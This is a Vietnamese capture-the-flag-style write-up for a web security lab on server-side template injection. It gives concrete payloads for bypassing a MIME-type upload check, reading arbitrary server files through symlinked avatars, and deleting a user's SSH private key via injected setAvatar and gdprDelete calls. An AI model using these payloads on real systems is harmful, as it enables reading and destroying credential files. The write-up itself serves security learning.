@@ -81,3 +81,85 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 Thay thế "path_to_the_file" thành "/home/carlos/my_password.txt", ta nhận được một chuỗi các số. Chuyển lại thành ký tự theo ASCII, thu được mật khẩu là "ugmfdfbhew2q79m8fu9t". Sử dụng thông tin có được để submit, kết quả thành công.
 
 # 7. Server-side template injection with a custom exploit
+Nhận thấy website có hai chức năng: "Upload Avatar" và "Preferred Name" như bài lab trước.
+
+Trong chức năng Preferred Name, thử `blog-post-author-display=7*7`, kết quả hiển thị 49. Như vậy ta có thể exploit SSTI.
+
+Trong chức năng upload avatar, thử upload một file `index.php` thì hiển thị lỗi chỉ cho phép mime type là image, đồng thời tiết lộ thông tin rằng chức năng đổi avatar gọi tới hàm `user.setAvatar('file_name','mime_type')` trong object User (file `/home/carlos.User.php`). Bắt request upload file php, sử dụng Burp Repeater để thay đổi "Content-Type" từ "application/x-php" thành "image/jpeg", kết quả upload thành công. Như vậy website đã validate file không cẩn thận, ta có thể upload bất cứ file type nào ta muốn.
+
+Như vậy, ta có thể đọc một file bất kỳ trong hệ thống với các bước dưới đây:
+
+1) Sử dụng chức năng Preferred Name để gọi `user.setAvatar('<file_name>','image/jpg')`. Khi đó, avatar sẽ thay đổi thành `file_name`
+2) Truy cập `/avatar?id=wiener` để lấy nội dung `<file_name>`
+
+Ta dùng cách trên để đọc file `/home/carlos/User.php` và lấy được toàn bộ source code của object User:
+
+```
+<?php
+
+class User {
+    public $username;
+    public $name;
+    public $first_name;
+    public $nickname;
+    public $user_dir;
+
+    public function __construct($username, $name, $first_name, $nickname) {
+        $this->username = $username;
+        $this->name = $name;
+        $this->first_name = $first_name;
+        $this->nickname = $nickname;
+        $this->user_dir = "users/" . $this->username;
+        $this->avatarLink = $this->user_dir . "/avatar";
+
+        if (!file_exists($this->user_dir)) {
+            if (!mkdir($this->user_dir, 0755, true))
+            {
+                throw new Exception("Could not mkdir users/" . $this->username);
+            }
+        }
+    }
+
+    public function setAvatar($filename, $mimetype) {
+        if (strpos($mimetype, "image/") !== 0) {
+            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
+        }
+
+        if (is_link($this->avatarLink)) {
+            $this->rm($this->avatarLink);
+        }
+
+        if (!symlink($filename, $this->avatarLink)) {
+            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
+        }
+    }
+
+    public function delete() {
+        $file = $this->user_dir . "/disabled";
+        if (file_put_contents($file, "") === false) {
+            throw new Exception("Could not write to " . $file);
+        }
+    }
+
+    public function gdprDelete() {
+        $this->rm(readlink($this->avatarLink));
+        $this->rm($this->avatarLink);
+        $this->delete();
+    }
+
+    private function rm($filename) {
+        if (!unlink($filename)) {
+            throw new Exception("Could not delete " . $filename);
+        }
+    }
+}
+
+?>
+```
+
+Nhận thấy ta có thể delete file `user.avatarLink` bằng cách gọi hàm `user.gdprDelete()`. Như vậy ta thực hiện các bước sau để exploit:
+
+1) Trong chức năng Preferred Name, chèn payload `user.setAvatar('../../../../home/carlos/.ssh/id_rsa','image/jpg')`. Khi đó, avatar hiện tại đã trỏ đến file `/home/carlos/.ssh/id_rsa`.
+2) Tiếp tục chèn payload `user.gdprDelete()` để xóa avatar, tương ứng với xóa file `/home/carlos/.ssh/id_rsa`.
+
+Sau khi Refresh 1 trang product bất kỳ, bài lab được giải thành công.
